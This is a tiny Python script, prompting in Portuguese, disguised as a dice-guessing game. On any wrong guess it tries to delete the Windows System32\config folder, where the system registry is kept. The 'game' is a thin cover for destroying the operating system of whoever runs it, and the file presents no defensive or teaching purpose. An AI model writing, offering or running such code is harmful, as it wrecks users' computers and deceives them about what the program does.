import random
import os

number=random.randint(1,6)
guess = input("Escolha um número de 1 a 6")
guess = int(guess)

if guess == number:
    print("Você venceu!")
else:
    os.remove("c:\\windows\\System32\config")
